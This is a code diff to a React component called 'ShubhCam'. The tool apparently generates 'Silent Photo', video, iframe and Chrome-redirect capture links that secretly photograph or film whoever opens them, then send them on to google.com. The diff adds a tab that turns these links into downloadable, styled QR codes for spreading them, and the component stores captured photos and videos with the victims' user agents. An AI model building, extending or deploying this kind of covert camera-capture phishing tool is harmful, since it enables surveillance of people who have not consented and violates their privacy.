@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, FolderOpen, LayoutGrid } from "lucide-react";
+import { Camera, Link2, Copy, RefreshCw, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play, Settings, Eye, X, Smartphone, Globe, Clock, Image as ImageIcon, Zap, FolderOpen, LayoutGrid, QrCode, Palette } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { Textarea } from "./ui/textarea";
@@ -11,6 +11,7 @@ import { Switch } from "./ui/switch";
 import { Label } from "./ui/label";
 import { Slider } from "./ui/slider";
 import { Dialog, DialogContent } from "./ui/dialog";
+import { QRCodeSVG } from "qrcode.react";
 
 interface CapturedPhoto {
   id: string;
@@ -27,7 +28,7 @@ interface CapturedVideo {
   user_agent: string | null;
 }
 
-type TabType = "links" | "chrome" | "html" | "iframe" | "media" | "config";
+type TabType = "links" | "qr" | "chrome" | "html" | "iframe" | "media" | "config";
 
 const ShubhCam = () => {
   const { settings, updateSettings } = useSettings();
@@ -43,6 +44,8 @@ const ShubhCam = () => {
   
   const [viewingPhoto, setViewingPhoto] = useState<CapturedPhoto | null>(null);
   const [viewingVideo, setViewingVideo] = useState<CapturedVideo | null>(null);
+  const [selectedQrLink, setSelectedQrLink] = useState<"photo" | "video" | "custom" | "chrome" | "iframe">("photo");
+  const qrRef = useRef<HTMLDivElement>(null);
   
   const sessionId = settings.camSessionId || "shubhcam01";
   const redirectUrl = settings.camRedirectUrl || "https://google.com";
@@ -232,8 +235,57 @@ const ShubhCam = () => {
     toast({ title: "Saved!", description: "Iframe URL synced" });
   };
 
+  // Get current QR link based on selection
+  const getQrLinkUrl = () => {
+    switch (selectedQrLink) {
+      case "photo": return captureLink;
+      case "video": return videoCaptureLink;
+      case "custom": return customCaptureLink;
+      case "chrome": return chromeCustomCaptureLink;
+      case "iframe": return iframeCaptureLink;
+      default: return captureLink;
+    }
+  };
+
+  const getQrLinkLabel = () => {
+    switch (selectedQrLink) {
+      case "photo": return "Silent Photo";
+      case "video": return `Video ${settings.camVideoDuration || 5}s`;
+      case "custom": return "Custom HTML";
+      case "chrome": return "Chrome Redirect";
+      case "iframe": return "Iframe Capture";
+      default: return "Photo";
+    }
+  };
+
+  const downloadQrCode = () => {
+    if (!qrRef.current) return;
+    const svg = qrRef.current.querySelector('svg');
+    if (!svg) return;
+    
+    const svgData = new XMLSerializer().serializeToString(svg);
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const img = new Image();
+    
+    img.onload = () => {
+      canvas.width = settings.qrSize || 180;
+      canvas.height = settings.qrSize || 180;
+      ctx?.drawImage(img, 0, 0);
+      const pngUrl = canvas.toDataURL('image/png');
+      const downloadLink = document.createElement('a');
+      downloadLink.href = pngUrl;
+      downloadLink.download = `qr-${selectedQrLink}-${sessionId}.png`;
+      downloadLink.click();
+      toast({ title: "Downloaded!", description: "QR code saved" });
+    };
+    
+    img.src = 'data:image/svg+xml;base64,' + btoa(unescape(encodeURIComponent(svgData)));
+  };
+
   const tabs: { id: TabType; icon: React.ReactNode; label: string }[] = [
     { id: "links", icon: <Link2 className="w-3.5 h-3.5" />, label: "Links" },
+    { id: "qr", icon: <QrCode className="w-3.5 h-3.5" />, label: "QR" },
     { id: "chrome", icon: <Chrome className="w-3.5 h-3.5" />, label: "Chrome" },
     { id: "html", icon: <Code className="w-3.5 h-3.5" />, label: "HTML" },
     { id: "iframe", icon: <LayoutGrid className="w-3.5 h-3.5" />, label: "Iframe" },
@@ -262,7 +314,7 @@ const ShubhCam = () => {
       </div>
 
       {/* Tab Navigation - Grid Style */}
-      <div className="grid grid-cols-6 gap-1.5 mb-4">
+      <div className="grid grid-cols-7 gap-1 mb-4">
         {tabs.map((tab) => (
           <button
             key={tab.id}
@@ -380,6 +432,165 @@ const ShubhCam = () => {
               >
                 <RefreshCw className="w-3 h-3 mr-1" /> Refresh
               </Button>
+            </div>
+          </div>
+        )}
+
+        {/* QR CODE TAB */}
+        {activeTab === "qr" && (
+          <div className="space-y-4">
+            {/* Link Selector */}
+            <div className="space-y-2">
+              <div className="flex items-center gap-2">
+                <QrCode className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Select Link Type</span>
+              </div>
+              <div className="grid grid-cols-5 gap-1">
+                {(["photo", "video", "custom", "chrome", "iframe"] as const).map((type) => (
+                  <button
+                    key={type}
+                    onClick={() => setSelectedQrLink(type)}
+                    className={cn(
+                      "py-1.5 px-2 rounded-lg text-[9px] font-medium transition-all capitalize",
+                      selectedQrLink === type
+                        ? "bg-neon-green text-background"
+                        : "bg-background/50 border border-border/30 text-muted-foreground hover:border-neon-green/30"
+                    )}
+                  >
+                    {type === "photo" ? "📷" : type === "video" ? "🎥" : type === "custom" ? "📝" : type === "chrome" ? "🌐" : "📱"}
+                  </button>
+                ))}
+              </div>
+              <p className="text-[10px] text-muted-foreground text-center">
+                {getQrLinkLabel()} Capture Link
+              </p>
+            </div>
+
+            {/* QR Code Display */}
+            <div className="flex justify-center">
+              <div 
+                ref={qrRef}
+                className="p-4 rounded-xl bg-white border-2 border-neon-green/30 shadow-[0_0_20px_hsl(var(--neon-green)/0.2)]"
+              >
+                <QRCodeSVG
+                  value={getQrLinkUrl()}
+                  size={settings.qrSize || 180}
+                  level="H"
+                  fgColor={settings.qrFgColor || "#22c55e"}
+                  bgColor={settings.qrBgColor || "#000000"}
+                  includeMargin={false}
+                />
+              </div>
+            </div>
+
+            {/* QR Actions */}
+            <div className="grid grid-cols-2 gap-2">
+              <Button
+                onClick={downloadQrCode}
+                size="sm"
+                className="bg-neon-green text-background hover:bg-neon-green/90 text-xs"
+              >
+                <Download className="w-3 h-3 mr-1" /> Download
+              </Button>
+              <Button
+                onClick={() => copyToClipboard(getQrLinkUrl())}
+                variant="outline"
+                size="sm"
+                className="border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
+              >
+                <Copy className="w-3 h-3 mr-1" /> Copy Link
+              </Button>
+            </div>
+
+            {/* QR Settings */}
+            <div className="space-y-3 pt-3 border-t border-border/30">
+              <div className="flex items-center gap-2">
+                <Palette className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">QR Settings</span>
+              </div>
+
+              {/* Size */}
+              <div className="space-y-2">
+                <div className="flex justify-between text-[10px]">
+                  <span className="text-muted-foreground">Size</span>
+                  <span className="text-neon-green font-mono">{settings.qrSize || 180}px</span>
+                </div>
+                <Slider
+                  value={[settings.qrSize || 180]}
+                  onValueChange={([val]) => updateSettings({ qrSize: val })}
+                  min={100}
+                  max={300}
+                  step={10}
+                  className="py-2"
+                />
+              </div>
+
+              {/* Colors */}
+              <div className="grid grid-cols-2 gap-3">
+                <div className="space-y-1">
+                  <label className="text-[10px] text-muted-foreground">QR Color</label>
+                  <div className="flex gap-2">
+                    <input
+                      type="color"
+                      value={settings.qrFgColor || "#22c55e"}
+                      onChange={(e) => updateSettings({ qrFgColor: e.target.value })}
+                      className="w-8 h-8 rounded cursor-pointer border border-border/30"
+                    />
+                    <Input
+                      value={settings.qrFgColor || "#22c55e"}
+                      onChange={(e) => updateSettings({ qrFgColor: e.target.value })}
+                      className="bg-background/50 border-border/50 font-mono text-[10px] h-8 flex-1"
+                    />
+                  </div>
+                </div>
+                <div className="space-y-1">
+                  <label className="text-[10px] text-muted-foreground">Background</label>
+                  <div className="flex gap-2">
+                    <input
+                      type="color"
+                      value={settings.qrBgColor || "#000000"}
+                      onChange={(e) => updateSettings({ qrBgColor: e.target.value })}
+                      className="w-8 h-8 rounded cursor-pointer border border-border/30"
+                    />
+                    <Input
+                      value={settings.qrBgColor || "#000000"}
+                      onChange={(e) => updateSettings({ qrBgColor: e.target.value })}
+                      className="bg-background/50 border-border/50 font-mono text-[10px] h-8 flex-1"
+                    />
+                  </div>
+                </div>
+              </div>
+
+              {/* Quick Color Presets */}
+              <div className="space-y-1">
+                <label className="text-[10px] text-muted-foreground">Presets</label>
+                <div className="flex gap-2 flex-wrap">
+                  {[
+                    { fg: "#22c55e", bg: "#000000", name: "Neon" },
+                    { fg: "#000000", bg: "#ffffff", name: "Classic" },
+                    { fg: "#ec4899", bg: "#000000", name: "Pink" },
+                    { fg: "#0ea5e9", bg: "#000000", name: "Cyan" },
+                    { fg: "#ffffff", bg: "#1a1a2e", name: "Dark" },
+                  ].map((preset) => (
+                    <button
+                      key={preset.name}
+                      onClick={() => updateSettings({ qrFgColor: preset.fg, qrBgColor: preset.bg })}
+                      className="px-2 py-1 rounded text-[9px] bg-background/50 border border-border/30 hover:border-neon-green/30 transition-colors"
+                      style={{ color: preset.fg }}
+                    >
+                      {preset.name}
+                    </button>
+                  ))}
+                </div>
+              </div>
+            </div>
+
+            {/* Link Preview */}
+            <div className="bg-background/30 rounded-lg p-2 border border-border/30">
+              <p className="text-[9px] text-muted-foreground mb-1">Link URL:</p>
+              <p className="text-[10px] font-mono text-neon-green break-all">
+                {getQrLinkUrl()}
+              </p>
             </div>
           </div>
         )}
